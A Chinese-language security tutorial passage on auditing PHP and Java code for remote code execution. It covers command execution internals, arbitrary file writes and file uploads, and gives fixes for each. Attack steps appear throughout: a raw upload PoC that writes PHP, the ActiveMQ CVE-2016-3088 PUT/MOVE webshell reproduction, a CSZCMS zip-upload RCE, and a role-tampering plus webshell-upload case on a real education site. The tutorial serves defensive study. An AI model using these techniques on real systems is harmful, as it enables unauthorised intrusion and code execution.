[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169230740-dd198ce0-2aed-48ad-94e5-e750cb0f1c90.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169230740-dd198ce0-2aed-48ad-94e5-e750cb0f1c90.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169231208-37d3cd09-36b5-431b-a0ad-da10f6c96bae.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169231208-37d3cd09-36b5-431b-a0ad-da10f6c96bae.png)

跟进，发现最终的参数转入 create 函数中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169231069-bf22f789-a0cb-47a2-967e-6244d37cb275.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169231069-bf22f789-a0cb-47a2-967e-6244d37cb275.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169231240-b2ab8c19-fec4-479a-857f-79211410d8fc.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169231240-b2ab8c19-fec4-479a-857f-79211410d8fc.png)

跟进发现是 native 函数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169231644-07cd5eda-2e27-4e9e-bc1a-47fb7bb2c807.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169231644-07cd5eda-2e27-4e9e-bc1a-47fb7bb2c807.png)

而 java 更底层的需要下源码

[https://github.com/openjdk/jdk8/](https://github.com/openjdk/jdk8/)

我这里下载的是

[https://codeload.github.com/openjdk/jdk8/zip/refs/tags/jdk8-b132](https://codeload.github.com/openjdk/jdk8/zip/refs/tags/jdk8-b132)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169231696-1ab0031c-425c-40b5-ae9d-b568375f903b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169231696-1ab0031c-425c-40b5-ae9d-b568375f903b.png)

而 create 具体实现是在 jdk\src\windows\native\java\lang\ProcessImpl_md.c 中

定位函数，Jni 的命名规范为

前缀 Java

完全的类名和包名，以_分割

方法名

方法名后面跟上_

直接定位到 Java_java_lang_ProcessImpl_create，初始化后进入 processCreate 中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169232051-89a0807f-4134-4962-a7ca-731cebe98910.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169232051-89a0807f-4134-4962-a7ca-731cebe98910.png)

跟进

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169232130-a4a95d32-c5b9-411d-9f49-43981fb22edf.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169232130-a4a95d32-c5b9-411d-9f49-43981fb22edf.png)

经过前面的定义后，使用 CreateProcessW 进行解析并执行命令，至此整体流程结束

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169232180-ae5f2f7a-c118-4b45-a9a6-fdfa666d3fff.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169232180-ae5f2f7a-c118-4b45-a9a6-fdfa666d3fff.png)

而两者分析完后不难发现，php 中的函数 system 等之所以可以进行 system(whoami|echo 1) 这样的管道符拼接，是因为在 CreateProcessW 前，硬编码了 cmd.exe /c “whoami|echo 1”。而 java 当中在 windows 下是没有进行硬编码的，CreateProcessW 这个 API 是没有解析 & | ; 等符号功能的，所以自然也就无法进行拼接 RCE 了。

本文只进行了 windows 下的分析，linux 下各位师傅如果有兴趣可以自己分析看看

### **3.1.6 修复 / 预防方案**

使用安全的过滤函数例如 escapeshellarg 或 escapeshellcmd

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169232372-ac513a48-5f1e-4afc-8e9a-68ff1a824109.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169232372-ac513a48-5f1e-4afc-8e9a-68ff1a824109.png)

也可以使用白名单命令

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169232447-b98b62dd-7df8-404f-b1f1-40b66394903d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169232447-b98b62dd-7df8-404f-b1f1-40b66394903d.png)

还有正则，只允许字母和数字

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169232849-6423e5b3-ae8c-4d8f-be99-764e5f2fd794.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169232849-6423e5b3-ae8c-4d8f-be99-764e5f2fd794.png)

而 java 当中没有 php 的安全函数，但他本身的命令传参就会防止特殊符号。所以用正则进行控制即可

String userInput = ...; // 从用户或外部源获取的输入

if (!userInput.matches("[a-zA-Z0-9]+")) {

throw new IllegalArgumentException("不合法的输入");

}

**3.2 任意文件写入导致 RCE**
--------------------

任意文件写入漏洞（Arbitrary File Write Vulnerability），它允许攻击者将数据写入服务器上的文件，甚至创建新文件。这种漏洞通常发生在应用程序不正确地处理文件写入操作时。

### **3.2.1 PHP 任意文件写入方式**

1 file_put_contents

这个函数用于简单地将一个字符串写入文件，如果文件不存在会尝试创建它。它是一个高级别的操作，相当于依次调用 fopen, fwrite, 和 fclose。可以指定标志来决定是否追加数据到文件或者是覆盖原有的数据。适用于快速简单地写入数据到文件。

2 fwrite/fputs

fwrite 与 fputs 函数用法完全相同

这个函数用于向一个打开的文件流（例如通过 fopen 获得的资源）写入数据。需要更细粒度的控制文件操作时（例如，持续写入数据到同一个文件），fwrite 更加适用。用于写入数据之前，必须先用 fopen 打开文件并获得文件指针。

3 fprintf

类似于 fwrite，但它提供了格式化功能，类似于 printf 函数。允许你按照特定的格式将数据写入到文件流。同样需要一个通过 fopen 打开的文件指针。适用于需要按照特定格式写入数据的场景。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169233032-4a82097f-adac-4627-b4db-b18cc25a9725.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169233032-4a82097f-adac-4627-b4db-b18cc25a9725.png)

### **3.2.2 PHP 任意文件写入 RCE 案例**

拿到某设备源码，全局搜索 fwrite 函数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169233064-393e3bce-2c25-4d2d-9a14-8f2811b1b96d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169233064-393e3bce-2c25-4d2d-9a14-8f2811b1b96d.png)

可以看到 10218 行里使用了该函数，写入 $buff 数据到 $out 文件，然后就是分别溯源这两个参数看是否可控，先是 $buff，可以看到两种方式，一种是 fopen 直接获取用户的参数，另一种是通过 php 伪协议。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169233135-d0034485-97af-4805-97f7-caeef672fa7a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169233135-d0034485-97af-4805-97f7-caeef672fa7a.png)

然后就是 $out，从 10167 行获取到 name 参数，赋值给 fileName，然后拼接到 filePath，然后会给 chunk 一次三目运算，紧接着就是拼到了 out，但是我们可以看到，out 的后缀名是写死的. parttmp，

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169233358-33d6dac0-6b0c-4dd1-a90a-58bf02d33165.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169233358-33d6dac0-6b0c-4dd1-a90a-58bf02d33165.png)

此时的后缀名不是我们预想的 php，那该如何呢，继续往下审计，我们可以看到 10222 行这里给 rname 了一下重命名为两个拼接变量. part

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169233806-bc583600-50bc-4be2-9170-4ad6b97d5e8b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169233806-bc583600-50bc-4be2-9170-4ad6b97d5e8b.png)

里有一个 pathinfo 函数，其中的变量刚好是我们的 filename，Pathinfo 就是以数组的形式返回路径信息，可以看到在 10235 行获取到了后缀名

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169233870-47550873-35df-463d-9ec8-c0adefdcfac3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169233870-47550873-35df-463d-9ec8-c0adefdcfac3.png)

然后 10234 先是 md5 随机生成了一个 hashstr，然后拼接到了 hashname 中，并且还拼接了后缀名，也就是我们开始给的 name 参数后缀，然后将 hashname 和 uploaddir 拼接到了 uploadpath [![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169234097-19badc62-a71f-4dd7-a26e-fabd51ebc0bf.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169234097-19badc62-a71f-4dd7-a26e-fabd51ebc0bf.png)

buff 和 out 均可控，并且 out 文件拼接的是 uploadpath, 而这个参数的后缀刚好是 php，于是成功写入

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169234192-4c447907-e701-4653-bcee-d78cb45b4030.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169234192-4c447907-e701-4653-bcee-d78cb45b4030.png)

因为是 tp 框架，就不需要找路由方式了

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169234636-8a8f62e5-253b-4691-9745-cbedeaf2e2a2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169234636-8a8f62e5-253b-4691-9745-cbedeaf2e2a2.png)

然后我们即可构造 poc 如下：

POST /XXX/index.php/Admin/index/web_upload_templateHTTP/1.1

XXXXXX

XXX

Content-Type: multipart/form-data; boundary=---------------------------41184676334

Content-Length: 222

-----------------------------41184676334

Content-Disposition: form-data;

Content-Type: application/octet-stream

<?php phpinfo(); ?>

-----------------------------41184676334--

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169234997-fd6f0599-7bf9-49e1-878d-b54bba6440d7.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169234997-fd6f0599-7bf9-49e1-878d-b54bba6440d7.png)

成功 RCE

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169235014-8d750d55-570e-42b2-8a52-dd5eb7240a7e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169235014-8d750d55-570e-42b2-8a52-dd5eb7240a7e.png)

### **3.2.3 JAVA 任意文件写入方式**

JAVA 当中可以写入文件的函数如下

1 FileOutputStream

FileOutputStream 是一个用于写入字节到文件的输出流类。它直接写入字节，因此非常适合处理二进制数据，如图像和音频文件。它直接与底层操作系统的文件写入机制交互，没有内置的缓冲机制。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169235679-df5086c3-c700-4329-81b2-c6df5c29b7d2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169235679-df5086c3-c700-4329-81b2-c6df5c29b7d2.png)

2 BufferedOutputStream

BufferedOutputStream 是 OutputStream 的一个子类，它添加了缓冲功能。这意味着数据首先被写入到内存缓冲区，当缓冲区满时，数据才会写入文件。这可以提高文件写入的效率，特别是在多次写入小量数据的场景中。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169235751-7bcf4cd3-85e3-48b2-888b-a2501327fd58.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169235751-7bcf4cd3-85e3-48b2-888b-a2501327fd58.png)

3 FileWriter

FileWriter 用于写入字符数据到文件。它是写入文本数据的便捷方式，特别是当数据是字符串时。它直接将字符数据转换为字节，并写入到文件中。因此，它更适合处理文本数据。FileWriter 基于默认的字符编码。要指定不同的编码，可能需要使用 OutputStreamWriter 与 FileOutputStream 的组合。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169236503-2d73982b-4657-4d39-beb5-ef48ca79d63d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169236503-2d73982b-4657-4d39-beb5-ef48ca79d63d.png)

4 Files.write

Files.write 是 Java NIO 包中的一个高级方法，用于以简单、直接的方式将字节序列写入文件。它自动处理文件的打开和关闭，避免了手动管理底层资源。内部实现上，Files.write 提供了缓冲机制，能够有效提升写入性能，适用于写入文本或二进制数据。此方法支持一次性写入所有内容，使得文件操作既高效又易于使用。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169236777-5600e7bf-70cf-42ab-a700-a2c86d414684.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169236777-5600e7bf-70cf-42ab-a700-a2c86d414684.png)

### **3.2.4 JAVA 任意文件写入 RCE 案例**

这里使用 activemq 的任意文件写入来作为案例（CVE-2016-3088）

复现过程：

ActiveMQ 的 FileServer 允许用户通过 PUT 方法上传文件到指定目录（但此目录没有执行权限），同时处理 HTTP MOVE 方法的代码没有对目的路径做过滤，因此，可以通过 PUT 请求上传一个 webshell，然后再通过 MOVE 方法将 webshell 移动至有执行权限的目录中。

漏洞复现：

1.  新建 docker-compose.yml，内容如下。

version: '2'

services:

activemq:

image: vulhub/activemq:5.11.1-with-cron

ports:

- "61616:61616"

- "8161:8161"

1.  在 docker-compose.yml 目录下使用 docker compose build 命令构建，后使用 docker compose up -d 启动环境

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169237011-5d7271aa-4f3a-4edf-a85a-07f9c2bd18fb.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169237011-5d7271aa-4f3a-4edf-a85a-07f9c2bd18fb.png)

1.  访问 [http://localhost:8161/](http://localhost:8161/) ，表示环境启动成功

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169237347-8f7b3c0b-834b-4441-bc99-4f43bedaf07f.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169237347-8f7b3c0b-834b-4441-bc99-4f43bedaf07f.png)

1.  使用 PUT 方法上传 webshell

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169237337-ab4b4d34-4f55-4796-a850-87893003f790.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169237337-ab4b4d34-4f55-4796-a850-87893003f790.png)

1.  使用 MOVE 方法对上传的文件移动并更改为. jsp 后缀

写入 webshell，需要写在 admin 或 api 应用中，而这两个应用都需要登录才能访问。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169237818-afe1c8bc-a992-4c6f-80be-323c87b1191a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169237818-afe1c8bc-a992-4c6f-80be-323c87b1191a.png)

1.  访问 webshell 成功执行命令（需要登录）: /api/s.jsp

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169238146-8d17326f-e47b-4524-9a9e-aed6f08b9290.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169238146-8d17326f-e47b-4524-9a9e-aed6f08b9290.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169238373-fb622136-137f-4dfb-aaab-507086b67ce4.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169238373-fb622136-137f-4dfb-aaab-507086b67ce4.png)

分析过程

下载源码

[https://archive.apache.org/dist/activemq/apache-activemq/5.7.0/activemq-parent-5.7.0-source-release.zip](https://archive.apache.org/dist/activemq/apache-activemq/5.7.0/activemq-parent-5.7.0-source-release.zip)

在 RestFilter.java 文件中，编写了 put 处理方式，先检测了访问的用户是否有权限，判断写入的文件是否存在，如果存在就删除。然后使用 FileOutputStream 进行写入，最后返回 204 不设置回显

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169238833-804c8fba-33af-4571-b16e-a5cc9a250699.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169238833-804c8fba-33af-4571-b16e-a5cc9a250699.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169239001-33ec761b-3fa4-4549-aeb0-2acf6280233e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169239001-33ec761b-3fa4-4549-aeb0-2acf6280233e.png)

其中对于路径的定位在 jetty.xml

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169239318-a062bb08-f850-4def-9983-e5d3241faaa9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169239318-a062bb08-f850-4def-9983-e5d3241faaa9.png)

在 doMove 函数中定义了 move 请求的处理方式，也是先检测有没有权限，然后获取需要移动的文件地址，尝试将文件移动到目标位置。首先，将目的地字符串转换为 URL 对象，使用一个 IOHelper.copy 将文件复制到目标位置，随后删除原文件。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169239766-567eff1a-f3cd-4258-8b97-f83fa86c18e0.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169239766-567eff1a-f3cd-4258-8b97-f83fa86c18e0.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169239876-fb288b69-2fc6-4a76-864b-6337ebcc557e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169239876-fb288b69-2fc6-4a76-864b-6337ebcc557e.png)

### **3.2.5 修复 / 预防方案**

Php:

可以使用安全过滤函数，禁止写入敏感代码，例如 strip_tags 可以移除 php 标签

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169240073-4af7d2d0-b603-4089-b8b6-b055c9d297d8.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169240073-4af7d2d0-b603-4089-b8b6-b055c9d297d8.png)

还有以下方式

路径验证：在应用程序中对文件路径进行验证，确保用户提供的文件路径是受信任且合法的。不要直接使用用户提供的路径来写入文件，而是应该使用相对路径或者将用户提供的路径与预定义的安全路径进行组合。

权限控制：确保应用程序以最低权限执行，限制其对文件系统的写入权限。在操作系统级别，确保文件系统权限设置正确，应用程序只能写入其必要的目录，并且仅有必要的权限。

文件名随机化：在写入文件时，使用随机生成的文件名而不是用户提供的文件名。这可以防止攻击者直接访问写入的文件。

白名单验证：对于涉及到写入文件的操作，应该使用白名单验证来限制写入的文件类型和目录。只允许应用程序写入预定义的安全目录，并且只允许写入特定类型的文件。

**3.3 文件上传导致 RCE**
------------------

文件上传漏洞（File Upload Vulnearability），通常发生在 Web 应用程序中，尤其是那些允许用户上传文件的地方。这种漏洞的本质在于，应用程序在处理上传的文件时没有充分验证或限制，从而允许攻击者上传恶意文件。

### **3.3.1 PHP 文件上传方式**

PHP 下可直接上传文件的函数如下

1 move_uploaded_file

php 只有这个函数负责文件上传，

用法如下

move_uploaded_file(string $from, string $to): bool

$from 上传的文件的文件名。$to 移动文件到这个位置。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169240380-60e64533-fa4b-4b80-8fae-668d8fc66cc7.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169240380-60e64533-fa4b-4b80-8fae-668d8fc66cc7.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169240842-252c6a77-751b-4abc-b03f-ec34fe0daa06.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169240842-252c6a77-751b-4abc-b03f-ec34fe0daa06.png)

### **3.3.2 PHP 文件上传案例**

官网

[https://www.cszcms.com/product/download](https://www.cszcms.com/product/download)

下载地址

[https://jaist.dl.sourceforge.net/project/cszcms/install/CSZCMS-V1.3.0.zip](https://jaist.dl.sourceforge.net/project/cszcms/install/CSZCMS-V1.3.0.zip)

安装过程

访问 web 目录，然后填下下面的表

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169241238-8f7d0a04-0997-4ff6-a1de-d48904cb41a9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169241238-8f7d0a04-0997-4ff6-a1de-d48904cb41a9.png)

登录后台

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169241255-f93f4c7e-8082-4b26-a381-9f953e520f6f.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169241255-f93f4c7e-8082-4b26-a381-9f953e520f6f.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169241439-9168fbc4-b765-41ae-97ef-b11d246696f8.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169241439-9168fbc4-b765-41ae-97ef-b11d246696f8.png)

然后进入 maintenance System 中，选择文件进行上传

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169241781-0833ac1e-8c6d-4a3e-aa2d-f6d231a773d9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169241781-0833ac1e-8c6d-4a3e-aa2d-f6d231a773d9.png)

此时写一个 test.php，然后压缩成. zip 格式

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169242108-893a4f62-7644-44c7-b071-2c90239d0a9a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169242108-893a4f62-7644-44c7-b071-2c90239d0a9a.png)

上传成功

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169245736-7a479d6d-d988-45be-a80b-c52441e0c7be.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169245736-7a479d6d-d988-45be-a80b-c52441e0c7be.png)

访问目录下的 test.php，成功 RCE

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169245863-bfb91c80-0e04-408e-a26c-d01945cebe93.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169245863-bfb91c80-0e04-408e-a26c-d01945cebe93.png)

PS: 因为笔者是黑盒复现完就立马审了，本文是边审边写的，所以一些例如临时文件名和随机数可能会上下文不一致，但不会影响审计逻辑与阅读

下面是代审环节，通过路由定位到 install 函数，在 do_upload 函数前，是一些检测语句，比如 194 行判断是否登录，202 行判断上传的是否是压缩包

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169245978-21fff65f-c8cd-4238-8efa-a82c32cc1068.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169245978-21fff65f-c8cd-4238-8efa-a82c32cc1068.png)

进入到 211 行 do_upload 函数中，先是在 405 行判断了下路径是否能上传，然后 412 行判断文件是否可以上传

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169246782-4df0edd1-260d-4e19-8c89-c090397688ea.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169246782-4df0edd1-260d-4e19-8c89-c090397688ea.png)在 do_upload 函数中继续往下跟，一些平常的赋值与正常的判断，获取了文件名与后缀

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169246780-a7b4ad3b-2972-4b94-9f84-1bec33a03831.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169246780-a7b4ad3b-2972-4b94-9f84-1bec33a03831.png)

再往下走就可以看到上传点，这里是先用 copy 函数将存储的临时文件复制到正常的上传目录，如果不行的话再用 move_uploaded_file 进行上传

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169247523-b9aed107-6f17-4b53-8fbb-f8b6360727ac.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169247523-b9aed107-6f17-4b53-8fbb-f8b6360727ac.png)

出来后，跟着逻辑往下走，进入到 217 行 unzip->extract 进行解压

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169247585-f491812e-c2d4-4c16-a43f-f11ab10d9456.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169247585-f491812e-c2d4-4c16-a43f-f11ab10d9456.png)

然后进入到 84 行_list_files

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169247647-d1f5c0e2-a234-4036-89b0-f9efb3bd117e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169247647-d1f5c0e2-a234-4036-89b0-f9efb3bd117e.png)

在_list_files 函数中，208 行打开该压缩包，并进行

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169248178-d9cf8e34-538c-45da-b940-b111b518007d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169248178-d9cf8e34-538c-45da-b940-b111b518007d.png)

然后进入到 216 行_load_file_list_by_eof 函数，在 404 行获取到了压缩包的文件名

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169248228-9cd57eec-bfa1-42ba-bf33-2c685c2cbedb.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169248228-9cd57eec-bfa1-42ba-bf33-2c685c2cbedb.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169248555-3b02279b-9570-4bfc-8d00-d544a17c0932.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169248555-3b02279b-9570-4bfc-8d00-d544a17c0932.png)

然后回到上级函数，将 compressed_list 里面的参数继续 return 回去

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169248591-aacc03a2-1754-40ba-9a1a-ffdf8a803911.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169248591-aacc03a2-1754-40ba-9a1a-ffdf8a803911.png)

这里有个循环，判断压缩包里的文件

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169248701-161e85df-e00b-44f1-806a-f79684560efd.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169248701-161e85df-e00b-44f1-806a-f79684560efd.png)

继续往下走，进入到_extract_file 函数中，其中用刚刚的 compressed_file_name 赋值给了 $fdetails

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169249431-126f549b-cd5e-4dc8-a1f6-b9d6743244e2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169249431-126f549b-cd5e-4dc8-a1f6-b9d6743244e2.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169249459-bb17a44f-35f9-4db1-8145-8857688c2666.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169249459-bb17a44f-35f9-4db1-8145-8857688c2666.png)

往下走进入到_uncompress 函数中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169249614-462ba60b-606f-48eb-ac2b-f765d78a4fdb.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169249614-462ba60b-606f-48eb-ac2b-f765d78a4fdb.png)

判断 mode 为 8，通过三目运算符判断有值，即用 file_put_contents 写入文件

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169249693-e3988fc5-6fc2-40f1-b767-b92d403d6180.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169249693-e3988fc5-6fc2-40f1-b767-b92d403d6180.png)

最后 return 回去文件地址

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169250123-017fe20e-6354-48cb-aefa-a915f2e9972d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169250123-017fe20e-6354-48cb-aefa-a915f2e9972d.png)

成功在 web 目录下写入

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169250527-8a8c2970-82ce-4b2f-9bab-60934805d2bd.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169250527-8a8c2970-82ce-4b2f-9bab-60934805d2bd.png)

### **3.3.3 JAVA 任意文件上传方式**

JSP 下进行上传文件的代码如下

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169250569-affe1a64-413e-49cd-aaf0-b8e1b2f63bde.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169250569-affe1a64-413e-49cd-aaf0-b8e1b2f63bde.png)

### **3.3.4 JAVA 任意文件上传案例**

我这里选用之前交 EDU 的一个案例，在注册页面将参数 student 改成 teacher

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169250616-e119a421-73af-4643-a0e1-faaabcea8a6a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169250616-e119a421-73af-4643-a0e1-faaabcea8a6a.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169251112-a51d7fcd-e3d7-4375-bfd5-693efedf5287.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169251112-a51d7fcd-e3d7-4375-bfd5-693efedf5287.png)

注册后进入后台，新建一个管理员，然后进来即为管理员身份

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169251321-62814f06-6ef8-40af-a8e4-c03eff763bbd.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169251321-62814f06-6ef8-40af-a8e4-c03eff763bbd.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169251640-cadd74ee-6379-4fb8-b705-d1361827e4d6.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169251640-cadd74ee-6379-4fb8-b705-d1361827e4d6.png)

找到上传点进行上传

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169251745-d681d193-6c92-4963-857a-fef782361412.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169251745-d681d193-6c92-4963-857a-fef782361412.png)

没有对内容过滤，但是只能上传白名单的文件

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169252774-8053e064-7191-4f08-8a81-81ad03ad446b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169252774-8053e064-7191-4f08-8a81-81ad03ad446b.png)

在另一个模块找到了一个新的上传点，可以从服务器上选取文件上传，然后找到刚刚上传的图片马

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169252693-116f15ae-eab8-43c1-a482-7a02cfcaf865.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169252693-116f15ae-eab8-43c1-a482-7a02cfcaf865.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169253030-39bc9af9-be75-4c20-9ea9-dac6136db815.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169253030-39bc9af9-be75-4c20-9ea9-dac6136db815.png)

发现可以 后缀名并且成功解析代码

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169253189-7497c5ee-a2ea-4b67-a571-2023c3786110.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169253189-7497c5ee-a2ea-4b67-a571-2023c3786110.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169253472-0234936a-34b4-45f1-831b-94d20a7241c1.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169253472-0234936a-34b4-45f1-831b-94d20a7241c1.png)

漏洞分析

先分析注册的，在 REgisterController 中的 registerStuUser 函数中，判断了 ROLE_ID 是 students 还是 teacher，没有其他任何判断，仅仅只接受传参然后进入语句当中，所以改 ROLE_ID 为 teacher 即可

